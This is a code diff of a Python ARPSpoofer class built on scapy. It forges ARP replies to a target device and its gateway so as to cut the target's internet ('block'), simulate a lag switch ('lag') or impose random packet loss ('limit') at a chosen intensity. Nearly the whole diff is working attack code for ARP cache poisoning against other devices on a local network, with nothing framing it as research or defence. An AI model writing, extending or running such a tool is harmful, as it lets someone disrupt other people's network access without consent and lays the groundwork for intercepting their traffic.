@@ -6,114 +6,157 @@ from scapy.all import ARP, Ether, conf, sendp
 
 
 class ARPSpoofer:
+    """
+    Three modes per target device:
+
+    block  — continuous ARP poison, complete internet cutoff.
+    lag    — pulses poison/restore to simulate a lag switch.
+             intensity (1-100): higher = longer block bursts = more lag.
+    limit  — randomly poisons to simulate packet loss / bandwidth cap.
+             intensity (1-100): percentage of cycles that are poisoned.
+    """
 
     def __init__(self, iface: str | None = None):
-        self._iface  = iface or conf.route.route("0.0.0.0")[0]
-        self._lock   = threading.Lock()
-        self._tokens: dict[str, int] = {}
+        self._state: dict[str, dict] = {}   # ip -> {running, mode, intensity}
+        self._lock  = threading.Lock()
+        self._iface = iface or conf.route.route("0.0.0.0")[0]
 
     # ── public API ────────────────────────────────────────────────────────────
 
-    def apply(self, target_ip, target_mac, gateway_ip, gateway_mac,
-              mode="block", intensity=60):
+    def apply(self, target_ip: str, target_mac: str,
+              gateway_ip: str, gateway_mac: str,
+              mode: str = "block", intensity: int = 60) -> None:
+        """Start or update the effect on a target."""
+        self._stop(target_ip)
+
         with self._lock:
-            token = self._tokens.get(target_ip, 0) + 1
-            self._tokens[target_ip] = token
+            self._state[target_ip] = {"running": True,
+                                       "mode": mode,
+                                       "intensity": intensity}
+
         threading.Thread(
             target=self._loop,
-            args=(token, target_ip, target_mac, gateway_ip, gateway_mac, mode, intensity),
-            daemon=True,
-        ).start()
-
-    def remove(self, target_ip, target_mac, gateway_ip, gateway_mac):
-        with self._lock:
-            self._tokens.pop(target_ip, None)
-        threading.Thread(
-            target=self._do_restore,
             args=(target_ip, target_mac, gateway_ip, gateway_mac),
             daemon=True,
         ).start()
 
-    def remove_all(self, devices, gateway_ip, gateway_mac):
+    def remove(self, target_ip: str, target_mac: str,
+               gateway_ip: str, gateway_mac: str) -> None:
+        """Stop effect and restore ARP tables."""
+        self._stop(target_ip)
+        threading.Thread(
+            target=self._restore,
+            args=(target_ip, target_mac, gateway_ip, gateway_mac),
+            daemon=True,
+        ).start()
+
+    def remove_all(self, devices: list[dict],
+                   gateway_ip: str, gateway_mac: str) -> None:
         with self._lock:
-            ips = list(self._tokens.keys())
-            self._tokens.clear()
+            active = [ip for ip, s in self._state.items() if s["running"]]
+            for ip in active:
+                self._state[ip]["running"] = False
         for dev in devices:
-            if dev["ip"] in ips:
-                self._do_restore(dev["ip"], dev["mac"], gateway_ip, gateway_mac)
+            if dev["ip"] in active:
+                self._restore(dev["ip"], dev["mac"], gateway_ip, gateway_mac)
 
-    def is_active(self, target_ip):
-        return target_ip in self._tokens
+    def get_mode(self, target_ip: str) -> str:
+        """Returns current mode or 'normal' if not active."""
+        s = self._state.get(target_ip)
+        return s["mode"] if s and s["running"] else "normal"
 
-    def get_mode(self, target_ip):
-        return "active" if target_ip in self._tokens else "normal"
+    def is_active(self, target_ip: str) -> bool:
+        s = self._state.get(target_ip)
+        return bool(s and s["running"])
 
-    # ── loop ─────────────────────────────────────────────────────────────────
+    # ── internal loop ─────────────────────────────────────────────────────────
 
-    def _loop(self, token, target_ip, target_mac, gateway_ip, gateway_mac,
-              mode, intensity):
+    def _loop(self, target_ip: str, target_mac: str,
+              gateway_ip: str, gateway_mac: str) -> None:
+        while True:
+            with self._lock:
+                s = self._state.get(target_ip, {})
+                if not s.get("running"):
+                    break
+                mode      = s["mode"]
+                intensity = s["intensity"]
 
-        def alive():
-            return self._tokens.get(target_ip) == token
-
-        while alive():
             if mode == "block":
                 self._poison(target_ip, target_mac, gateway_ip, gateway_mac)
-                time.sleep(0.5)
+                time.sleep(1.5)
 
             elif mode == "lag":
-                block_t = 0.3 + (intensity / 100) * 2.7
-                allow_t = 0.5 - (intensity / 100) * 0.45
+                # block_time scales 0.2s→3s, allow_time scales 0.4s→0.05s
+                block_t = 0.2 + (intensity / 100) * 2.8
+                allow_t = 0.4 - (intensity / 100) * 0.35
 
-                t0 = time.time()
-                while alive() and time.time() - t0 < block_t:
+                for _ in range(3):
                     self._poison(target_ip, target_mac, gateway_ip, gateway_mac)
-                    time.sleep(0.1)
+                time.sleep(block_t)
 
-                if not alive():
-                    break
+                with self._lock:
+                    if not self._state.get(target_ip, {}).get("running"):
+                        break
 
-                self._poison_off(target_ip, target_mac, gateway_ip, gateway_mac)
+                self._restore(target_ip, target_mac, gateway_ip, gateway_mac,
+                              count=2, inter=0)
                 time.sleep(allow_t)
 
             elif mode == "limit":
+                # Poison `intensity`% of cycles → packet loss
                 if random.randint(1, 100) <= intensity:
                     self._poison(target_ip, target_mac, gateway_ip, gateway_mac)
                 else:
-                    self._poison_off(target_ip, target_mac, gateway_ip, gateway_mac)
-                time.sleep(0.2)
+                    self._restore(target_ip, target_mac, gateway_ip, gateway_mac)
+                time.sleep(0.25)
 
-    # ── ARP ───────────────────────────────────────────────────────────────────
+    # ── helpers ───────────────────────────────────────────────────────────────
 
-    def _poison(self, target_ip, target_mac, gateway_ip, gateway_mac):
-        try:
-            sendp([
-                Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip),
-                Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),
-            ], iface=self._iface, verbose=0)
-        except Exception as e:
-            print(f"[spoofer] poison error: {e}")
+    def _stop(self, target_ip: str) -> None:
+        with self._lock:
+            if target_ip in self._state:
+                self._state[target_ip]["running"] = False
 
-    def _poison_off(self, target_ip, target_mac, gateway_ip, gateway_mac):
-        """Send correct ARPs for lag/limit allow window — quick, 2 packets."""
-        self._send_restore(target_ip, target_mac, gateway_ip, gateway_mac, count=2)
+    def _poison(self, target_ip: str, target_mac: str,
+                gateway_ip: str, gateway_mac: str) -> None:
+        ok1 = self._send(target_mac,
+                         ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip))
+        ok2 = self._send(gateway_mac,
+                         ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
+        if not ok1 or not ok2:
+            with self._lock:
+                if target_ip in self._state:
+                    self._state[target_ip]["running"] = False
 
-    def _do_restore(self, target_ip, target_mac, gateway_ip, gateway_mac):
-        """Wait for last poison to clear, then flood correct ARPs."""
-        time.sleep(1.0)   # outlast the 0.5s poison interval
-        for _ in range(5):
-            self._send_restore(target_ip, target_mac, gateway_ip, gateway_mac, count=10)
-            time.sleep(0.4)
-
-    def _send_restore(self, target_ip, target_mac, gateway_ip, gateway_mac, count=10):
-        if not target_mac or not gateway_mac:
+    def _restore(self, target_ip: str, target_mac: str,
+                 gateway_ip: str, gateway_mac: str,
+                 count: int = 10, inter: float = 0.05) -> None:
+        if not (target_mac and gateway_mac):
             return
+        # Ethernet src must match ARP hwsrc or modern devices reject the packet.
         try:
-            sendp([
-                Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,
-                                              psrc=gateway_ip, hwsrc=gateway_mac),
-                Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
-                                              psrc=target_ip,  hwsrc=target_mac),
-            ], iface=self._iface, verbose=0, count=count)
+            sendp(
+                Ether(src=gateway_mac, dst=target_mac) /
+                ARP(op=2, pdst=target_ip, hwdst=target_mac,
+                    psrc=gateway_ip, hwsrc=gateway_mac),
+                iface=self._iface, verbose=0, count=count, inter=inter,
+            )
+            sendp(
+                Ether(src=target_mac, dst=gateway_mac) /
+                ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
+                    psrc=target_ip, hwsrc=target_mac),
+                iface=self._iface, verbose=0, count=count, inter=inter,
+            )
         except Exception as e:
-            print(f"[spoofer] restore error: {e}")
+            print(f"[spoofer] RESTORE FAILED: {e}")
+
+    def _send(self, dst_mac: str, arp_pkt,
+              count: int = 1) -> bool:
+        try:
+            sendp(Ether(dst=dst_mac) / arp_pkt,
+                  iface=self._iface, verbose=0, count=count)
+            return True
+        except Exception as e:
+            print(f"[spoofer] SEND FAILED: {e}")
+            print(f"[spoofer] Make sure you are running as Administrator and Npcap is installed.")
+            return False
